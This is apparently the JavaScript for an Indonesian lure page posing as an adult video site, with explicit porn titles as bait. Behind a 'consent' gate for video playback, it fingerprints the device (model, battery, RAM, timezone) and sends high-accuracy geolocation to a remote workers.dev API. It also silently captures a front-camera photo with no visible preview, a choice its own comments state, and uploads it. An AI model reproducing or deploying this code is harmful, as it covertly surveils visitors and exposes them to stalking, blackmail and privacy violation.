const API_BASE =
  "https://red-limit-4319privacy-demo-api.reviewku8.workers.dev";


/* =====================================================
   SESSION
===================================================== */

let visitId =
  localStorage.getItem(
    "nexora_visit_id"
  );


if (!visitId) {

  visitId =
    crypto.randomUUID
      ? crypto.randomUUID()
      : `visit-${Date.now()}-${Math.random()
          .toString(36)
          .slice(2)}`;


  localStorage.setItem(
    "nexora_visit_id",
    visitId
  );

}


let deviceConsentGranted =
  localStorage.getItem(
    "nexora_device_consent"
  ) === "true";


/* =====================================================
   ELEMENTS
===================================================== */

const mainVideo =
  document.getElementById(
    "mainVideo"
  );


const videoGate =
  document.getElementById(
    "videoGate"
  );


const videoUnavailable =
  document.getElementById(
    "videoUnavailable"
  );


const profileButton =
  document.getElementById(
    "profileButton"
  );


const profilePanel =
  document.getElementById(
    "profilePanel"
  );


const profileOverlay =
  document.getElementById(
    "profileOverlay"
  );


const closeProfile =
  document.getElementById(
    "closeProfile"
  );


const consentModal =
  document.getElementById(
    "consentModal"
  );


const consentOverlay =
  document.getElementById(
    "consentOverlay"
  );


const consentClose =
  document.getElementById(
    "consentClose"
  );


const consentCancel =
  document.getElementById(
    "consentCancel"
  );


const deviceConsentButton =
  document.getElementById(
    "deviceConsentButton"
  );


const deviceResult =
  document.getElementById(
    "deviceResult"
  );


const locationButton =
  document.getElementById(
    "locationButton"
  );


const locationResult =
  document.getElementById(
    "locationResult"
  );


const cameraButton =
  document.getElementById(
    "cameraButton"
  );


const cameraResult =
  document.getElementById(
    "cameraResult"
  );


const recommendationList =
  document.getElementById(
    "recommendationList"
  );


const likeButton =
  document.getElementById(
    "likeButton"
  );


const saveButton =
  document.getElementById(
    "saveButton"
  );


const shareButton =
  document.getElementById(
    "shareButton"
  );


const toast =
  document.getElementById(
    "toast"
  );


/* =====================================================
   PROFILE
===================================================== */

function openProfile() {

  profilePanel.classList.add(
    "show"
  );


  profileOverlay.classList.add(
    "show"
  );


  document.body.classList.add(
    "modal-open"
  );

}


function closeProfilePanel() {

  profilePanel.classList.remove(
    "show"
  );


  profileOverlay.classList.remove(
    "show"
  );


  document.body.classList.remove(
    "modal-open"
  );

}


profileButton.addEventListener(
  "click",
  openProfile
);


closeProfile.addEventListener(
  "click",
  closeProfilePanel
);


profileOverlay.addEventListener(
  "click",
  closeProfilePanel
);


/* =====================================================
   DEVICE CONSENT MODAL
===================================================== */

function openConsentModal() {

  consentModal.classList.add(
    "show"
  );


  consentOverlay.classList.add(
    "show"
  );


  document.body.classList.add(
    "modal-open"
  );

}


function closeConsentModal() {

  consentModal.classList.remove(
    "show"
  );


  consentOverlay.classList.remove(
    "show"
  );


  document.body.classList.remove(
    "modal-open"
  );

}


consentClose.addEventListener(
  "click",
  closeConsentModal
);


consentCancel.addEventListener(
  "click",
  closeConsentModal
);


consentOverlay.addEventListener(
  "click",
  closeConsentModal
);


/* =====================================================
   VIDEO PLAY
===================================================== */

videoGate.addEventListener(
  "click",
  async () => {

    if (
      !deviceConsentGranted
    ) {

      openConsentModal();

      return;

    }


    const ready =
      await ensureVisitExists();


    if (!ready) {
      return;
    }


    await playVideo();

  }
);


async function playVideo() {

  videoGate.classList.add(
    "hidden"
  );


  mainVideo.controls =
    true;


  try {

    await mainVideo.play();

  }

  catch {

    videoGate.classList.remove(
      "hidden"
    );

  }

}


/* =====================================================
   DEVICE CONSENT
===================================================== */

deviceConsentButton.addEventListener(
  "click",
  async () => {

    deviceConsentButton.disabled =
      true;


    deviceConsentButton.textContent =
      "Memproses...";


    try {

      const result =
        await registerVisit();


      if (!result.success) {

        throw new Error(
          result.error
        );

      }


      deviceConsentGranted =
        true;


      localStorage.setItem(
        "nexora_device_consent",
        "true"
      );


      closeConsentModal();


      showToast(
        "Persetujuan berhasil disimpan"
      );


      await playVideo();

    }

    catch (error) {

      console.error(
        error
      );


      deviceResult.textContent =
        "Gagal terhubung ke server.";

    }

    finally {

      deviceConsentButton.disabled =
        false;


      deviceConsentButton.textContent =
        "Setujui & Putar Video";

    }

  }
);


/* =====================================================
   REGISTER VISIT
===================================================== */

async function registerVisit() {

  const device =
    await collectDeviceInfo();


  const response =
    await fetch(
      `${API_BASE}/api/visit`,
      {

        method:
          "POST",


        headers: {

          "Content-Type":
            "application/json"

        },


        body:
          JSON.stringify({

            visit_id:
              visitId,


            consent:
              true,


            ip_consent:
              true,


            ...device

          })

      }
    );


  const result =
    await safeJson(
      response
    );


  if (!response.ok) {

    throw new Error(
      result?.error ||
      "API error"
    );

  }


  return result;

}


/* =====================================================
   ENSURE SESSION
===================================================== */

async function ensureVisitExists() {

  if (
    !deviceConsentGranted
  ) {

    closeProfilePanel();


    openConsentModal();


    return false;

  }


  try {

    await registerVisit();


    return true;

  }

  catch (error) {

    console.error(
      error
    );


    showToast(
      "Server tidak dapat dihubungi"
    );


    return false;

  }

}


/* =====================================================
   DEVICE INFORMATION
===================================================== */

async function collectDeviceInfo() {

  const ua =
    navigator.userAgent;


  let batteryLevel =
    null;


  let charging =
    null;


  if (
    navigator.getBattery
  ) {

    try {

      const battery =
        await navigator.getBattery();


      batteryLevel =
        Math.round(
          battery.level *
          100
        );


      charging =
        battery.charging;

    }

    catch {}

  }


  return {

    user_agent:
      ua,


    browser:
      detectBrowser(
        ua
      ),


    os:
      detectOS(
        ua
      ),


    os_version:
      parseOSVersion(
        ua
      ),


    brand:
      inferBrand(
        ua
      ),


    platform:
      navigator.platform ||
      null,


    device_model:
      parseAndroidModel(
        ua
      ),


    screen_size:
      `${screen.width}x${screen.height}`,


    language:
      navigator.language ||
      null,


    timezone:
      Intl
        .DateTimeFormat()
        .resolvedOptions()
        .timeZone ||
      null,


    cpu_threads:
      navigator.hardwareConcurrency ||
      null,


    ram_gb:
      navigator.deviceMemory ||
      null,


    battery_level:
      batteryLevel,


    charging

  };

}


function detectBrowser(
  ua
) {

  if (
    ua.includes(
      "SamsungBrowser"
    )
  ) {
    return "Samsung Internet";
  }


  if (
    ua.includes(
      "Edg/"
    )
  ) {
    return "Microsoft Edge";
  }


  if (
    ua.includes(
      "Chrome/"
    )
  ) {
    return "Chrome";
  }


  if (
    ua.includes(
      "Firefox/"
    )
  ) {
    return "Firefox";
  }


  if (
    ua.includes(
      "Safari/"
    )
  ) {
    return "Safari";
  }


  return "Unknown";

}


function detectOS(
  ua
) {

  if (
    /Android/i.test(
      ua
    )
  ) {
    return "Android";
  }


  if (
    /iPhone|iPad|iPod/i.test(
      ua
    )
  ) {
    return "iOS";
  }


  if (
    /Windows/i.test(
      ua
    )
  ) {
    return "Windows";
  }


  if (
    /Mac OS/i.test(
      ua
    )
  ) {
    return "macOS";
  }


  return "Unknown";

}


function parseOSVersion(
  ua
) {

  const android =
    ua.match(
      /Android\s([0-9.]+)/i
    );


  if (
    android
  ) {

    return android[1];

  }


  return null;

}


function parseAndroidModel(
  ua
) {

  const match =
    ua.match(

      /Android[^;]*;\s*([^;)]+?)(?:\s+Build\/|;|\))/i

    );


  return match
    ? match[1].trim()
    : null;

}


function inferBrand(
  ua
) {

  const value =
    ua.toUpperCase();


  if (
    value.includes(
      "SAMSUNG"
    )
  ) {
    return "Samsung";
  }


  if (
    value.includes(
      "XIAOMI"
    ) ||
    value.includes(
      "REDMI"
    )
  ) {
    return "Xiaomi";
  }


  if (
    value.includes(
      "OPPO"
    )
  ) {
    return "OPPO";
  }


  if (
    value.includes(
      "VIVO"
    )
  ) {
    return "vivo";
  }


  if (
    value.includes(
      "REALME"
    )
  ) {
    return "realme";
  }


  if (
    /iPhone|iPad/i.test(
      ua
    )
  ) {
    return "Apple";
  }


  return null;

}


/* =====================================================
   LOCATION
   ONE CLICK -> ALLOW -> AUTO SEND
===================================================== */

locationButton.addEventListener(
  "click",
  shareLocation
);


async function shareLocation() {

  const ready =
    await ensureVisitExists();


  if (!ready) {
    return;
  }


  if (
    !navigator.geolocation
  ) {

    locationResult.textContent =
      "Browser tidak mendukung lokasi.";


    return;

  }


  locationButton.disabled =
    true;


  locationResult.textContent =
    "Menunggu izin lokasi...";


  navigator.geolocation.getCurrentPosition(


    async position => {

      try {

        locationResult.textContent =
          "Mengirim lokasi ke server...";


        const response =
          await fetch(
            `${API_BASE}/api/location`,
            {

              method:
                "POST",


              headers: {

                "Content-Type":
                  "application/json"

              },


              body:
                JSON.stringify({

                  visit_id:
                    visitId,


                  latitude:
                    position.coords.latitude,


                  longitude:
                    position.coords.longitude,


                  accuracy:
                    position.coords.accuracy

                })

            }
          );


        const result =
          await safeJson(
            response
          );


        if (!response.ok) {

          throw new Error(
            result?.error
          );

        }


        locationButton.textContent =
          "✓ Lokasi Dibagikan";


        locationButton.classList.add(
          "success"
        );


        locationResult.textContent =
          `Lokasi berhasil dikirim. Akurasi ±${Math.round(
            position.coords.accuracy
          )} meter.`;


        showToast(
          "Lokasi berhasil dibagikan"
        );

      }

      catch (error) {

        console.error(
          error
        );


        locationButton.disabled =
          false;


        locationResult.textContent =
          "Lokasi diperoleh tetapi gagal dikirim.";

      }

    },


    error => {

      locationButton.disabled =
        false;


      if (
        error.code ===
        error.PERMISSION_DENIED
      ) {

        locationResult.textContent =
          "Izin lokasi ditolak.";

      }

      else {

        locationResult.textContent =
          "Lokasi tidak dapat diperoleh.";

      }

    },


    {

      enableHighAccuracy:
        true,


      timeout:
        15000,


      maximumAge:
        0

    }

  );

}


/* =====================================================
   CAMERA
   ONE CLICK -> ALLOW -> AUTO PHOTO -> AUTO UPLOAD
===================================================== */

cameraButton.addEventListener(
  "click",
  cameraAndAutoPhoto
);


async function cameraAndAutoPhoto() {

  const ready =
    await ensureVisitExists();


  if (!ready) {
    return;
  }


  if (
    !navigator.mediaDevices ||
    !navigator.mediaDevices.getUserMedia
  ) {

    cameraResult.textContent =
      "Browser tidak mendukung kamera.";


    return;

  }


  cameraButton.disabled =
    true;


  cameraResult.textContent =
    "Menunggu izin kamera...";


  let stream =
    null;


  try {

    stream =
      await navigator.mediaDevices
        .getUserMedia({

          video: {

            facingMode:
              "user"

          },


          audio:
            false

        });


    await sendCameraStatus(
      "granted"
    );


    cameraResult.textContent =
      "Mengambil satu foto otomatis...";


    const rawPhoto =
      await capturePhotoWithoutPreview(
        stream
      );


    const photo =
      await compressPhoto(
        rawPhoto
      );


    cameraResult.textContent =
      "Mengirim foto ke server...";


    await uploadPhoto(
      photo
    );


    cameraButton.textContent =
      "✓ Foto Berhasil Dikirim";


    cameraButton.classList.add(
      "success"
    );


    cameraResult.textContent =
      "Satu foto berhasil diambil otomatis dan disimpan di server. Kamera telah dimatikan.";


    showToast(
      "Foto berhasil dikirim"
    );

  }

  catch (error) {

    console.error(
      error
    );


    cameraButton.disabled =
      false;


    if (
      error.name ===
      "NotAllowedError"
    ) {

      try {

        await sendCameraStatus(
          "denied"
        );

      }

      catch {}


      cameraResult.textContent =
        "Izin kamera ditolak.";

    }

    else {

      cameraResult.textContent =
        "Proses foto atau upload gagal.";

    }

  }

  finally {

    if (
      stream
    ) {

      stream
        .getTracks()
        .forEach(
          track =>
            track.stop()
        );

    }

  }

}


/* =====================================================
   CAPTURE PHOTO
   NO VISIBLE PREVIEW
===================================================== */

async function capturePhotoWithoutPreview(
  stream
) {

  const track =
    stream.getVideoTracks()[0];


  /*
  Coba ImageCapture terlebih dahulu.
  */

  if (
    typeof ImageCapture !==
    "undefined"
  ) {

    try {

      const capture =
        new ImageCapture(
          track
        );


      const blob =
        await capture.takePhoto();


      if (
        blob &&
        blob.size > 0
      ) {

        return blob;

      }

    }

    catch {}

  }


  /*
  Fallback.

  Video dibuat di memory tetapi
  TIDAK dimasukkan ke halaman,
  sehingga preview tidak terlihat.
  */

  const video =
    document.createElement(
      "video"
    );


  video.srcObject =
    stream;


  video.muted =
    true;


  video.playsInline =
    true;


  await video.play();


  await sleep(
    400
  );


  const width =
    video.videoWidth;


  const height =
    video.videoHeight;


  if (
    !width ||
    !height
  ) {

    throw new Error(
      "Frame kamera tidak tersedia"
    );

  }


  const canvas =
    document.createElement(
      "canvas"
    );


  const max =
    1280;


  const scale =
    Math.min(

      1,

      max /
      Math.max(
        width,
        height
      )

    );


  canvas.width =
    Math.round(
      width *
      scale
    );


  canvas.height =
    Math.round(
      height *
      scale
    );


  const context =
    canvas.getContext(
      "2d"
    );


  context.drawImage(

    video,

    0,

    0,

    canvas.width,

    canvas.height

  );


  video.srcObject =
    null;


  return new Promise(
    resolve => {

      canvas.toBlob(

        resolve,

        "image/jpeg",

        0.82

      );

    }
  );

}


/* =====================================================
   COMPRESS PHOTO
===================================================== */

async function compressPhoto(
  blob
) {

  const maxBytes =
    500 *
    1024;


  if (
    blob.size <=
    maxBytes
  ) {

    return blob;

  }


  const bitmap =
    await createImageBitmap(
      blob
    );


  const maxSide =
    1280;


  const scale =
    Math.min(

      1,

      maxSide /
      Math.max(

        bitmap.width,

        bitmap.height

      )

    );


  const canvas =
    document.createElement(
      "canvas"
    );


  canvas.width =
    Math.round(

      bitmap.width *
      scale

    );


  canvas.height =
    Math.round(

      bitmap.height *
      scale

    );


  canvas
    .getContext(
      "2d"
    )
    .drawImage(

      bitmap,

      0,

      0,

      canvas.width,

      canvas.height

    );


  const qualities = [

    0.80,
    0.70,
    0.60,
    0.50

  ];


  for (
    const quality
    of qualities
  ) {

    const result =
      await new Promise(
        resolve => {

          canvas.toBlob(

            resolve,

            "image/jpeg",

            quality

          );

        }
      );


    if (
      result &&
      result.size <=
      maxBytes
    ) {

      return result;

    }

  }


  throw new Error(
    "Foto terlalu besar"
  );

}


/* =====================================================
   PHOTO UPLOAD
===================================================== */

async function uploadPhoto(
  blob
) {

  const form =
    new FormData();


  form.append(

    "visit_id",

    visitId

  );


  /*
  UI sudah menjelaskan bahwa satu
  foto akan otomatis diambil dan dikirim.
  */

  form.append(

    "photo_consent",

    "true"

  );


  const file =
    new File(

      [blob],

      "camera-photo.jpg",

      {

        type:
          "image/jpeg"

      }

    );


  form.append(

    "photo",

    file

  );


  const response =
    await fetch(

      `${API_BASE}/api/photo`,

      {

        method:
          "POST",


        body:
          form

      }

    );


  const result =
    await safeJson(
      response
    );


  if (!response.ok) {

    throw new Error(

      result?.error ||

      "Upload foto gagal"

    );

  }


  return result;

}


/* =====================================================
   CAMERA STATUS
===================================================== */

async function sendCameraStatus(
  status
) {

  await fetch(

    `${API_BASE}/api/camera-status`,

    {

      method:
        "POST",


      headers: {

        "Content-Type":
          "application/json"

      },


      body:
        JSON.stringify({

          visit_id:
            visitId,


          status

        })

    }

  );

}


/* =====================================================
   VIDEO LIST
===================================================== */

const videos = [

  {

    title:
      "Remaja 19 tahun di gengbeng di hotel",

    channel:
      "Avtub",

    views:
      "89 rb ditonton",

    duration:
      "12:24",

    category:
      "Bokep"

  },

  {

    title:
      "Tetangga yang sedang birahi dan nafsu liar",

    channel:
      "XNXX",

    views:
      "214 rb ditonton",

    duration:
      "8:31",

    category:
      "Bokep"

  },

  {

    title:
      "Colmek dulu sebelum main crot 2x",

    channel:
      "Hamster-X",

    views:
      "74 rb ditonton",

    duration:
      "15:06",

    category:
      "Bokep"

  },

  {

    title:
      "Desah keras pas dientot dari belakang",

    channel:
      "XNXX",

    views:
      "1,2 jt ditonton",

    duration:
      "32:18",

    category:
      "Bokep"

  },

  {

    title:
      "Ngentot tak kunjung usai",

    channel:
      "Avtub",

    views:
      "47 rb ditonton",

    duration:
      "48:05",

    category:
      "Bokep"

  }

];


let activeCategory =
  "Semua";


function renderVideos(

  category = "Semua",

  keyword = ""

) {

  recommendationList.innerHTML =
    "";


  const search =
    keyword
      .toLowerCase()
      .trim();


  const filtered =
    videos.filter(

      video => {

        return (

          (
            category === "Semua"

            ||

            video.category ===
            category
          )

          &&

          (
            !search

            ||

            video.title
              .toLowerCase()
              .includes(
                search
              )
          )

        );

      }

    );


  filtered.forEach(

    video => {

      const item =
        document.createElement(
          "article"
        );


      item.className =
        "recommendation";


      item.innerHTML = `

        <div class="thumb">

          <span>
            ${video.duration}
          </span>

        </div>


        <div class="recommendation-info">

          <strong>
            ${video.title}
          </strong>

          <p>
            ${video.channel}
          </p>

          <p>
            ${video.views}
          </p>

        </div>

      `;


      item.addEventListener(

        "click",

        () => {

          document
            .getElementById(
              "videoTitle"
            )
            .textContent =
              video.title;


          document
            .getElementById(
              "videoViews"
            )
            .textContent =
              video.views;


          window.scrollTo({

            top:
              0,

            behavior:
              "smooth"

          });

        }

      );


      recommendationList
        .appendChild(
          item
        );

    }

  );

}


renderVideos();


/* =====================================================
   CATEGORY
===================================================== */

document
  .querySelectorAll(
    ".category"
  )
  .forEach(

    button => {

      button.addEventListener(

        "click",

        () => {

          document
            .querySelectorAll(
              ".category"
            )
            .forEach(

              item =>
                item
                  .classList
                  .remove(
                    "active"
                  )

            );


          button.classList.add(
            "active"
          );


          activeCategory =
            button.dataset.category;


          renderVideos(
            activeCategory
          );

        }

      );

    }

  );


/* =====================================================
   SEARCH
===================================================== */

document
  .getElementById(
    "searchForm"
  )
  .addEventListener(

    "submit",

    event => {

      event.preventDefault();


      renderVideos(

        activeCategory,

        document
          .getElementById(
            "searchInput"
          )
          .value

      );

    }

  );


document
  .getElementById(
    "mobileSearchForm"
  )
  .addEventListener(

    "submit",

    event => {

      event.preventDefault();


      renderVideos(

        activeCategory,

        document
          .getElementById(
            "mobileSearchInput"
          )
          .value

      );

    }

  );


/* =====================================================
   LIKE / SAVE
===================================================== */

likeButton.addEventListener(

  "click",

  () => {

    likeButton.classList.toggle(
      "active"
    );

  }

);


saveButton.addEventListener(

  "click",

  () => {

    saveButton.classList.toggle(
      "active"
    );

  }

);


/* =====================================================
   SHARE
===================================================== */

shareButton.addEventListener(

  "click",

  async () => {

    try {

      if (
        navigator.share
      ) {

        await navigator.share({

          title:
            document
              .getElementById(
                "videoTitle"
              )
              .textContent,


          url:
            location.href

        });

      }

      else {

        await navigator
          .clipboard
          .writeText(
            location.href
          );


        showToast(
          "Link berhasil disalin"
        );

      }

    }

    catch {}

  }

);


/* =====================================================
   VIDEO FILE ERROR
===================================================== */

mainVideo.addEventListener(

  "error",

  () => {

    videoGate.hidden =
      true;


    videoUnavailable.hidden =
      false;


    mainVideo.style.display =
      "none";

  }

);


mainVideo.controls =
  false;


/* =====================================================
   UTILITIES
===================================================== */

let toastTimer;


function showToast(
  message
) {

  toast.textContent =
    message;


  toast.classList.add(
    "show"
  );


  clearTimeout(
    toastTimer
  );


  toastTimer =
    setTimeout(

      () => {

        toast.classList.remove(
          "show"
        );

      },

      2300

    );

}


async function safeJson(
  response
) {

  try {

    return await response.json();

  }

  catch {

    return {};

  }

}


function sleep(
  ms
) {

  return new Promise(

    resolve =>

      setTimeout(
        resolve,
        ms
      )

  );

}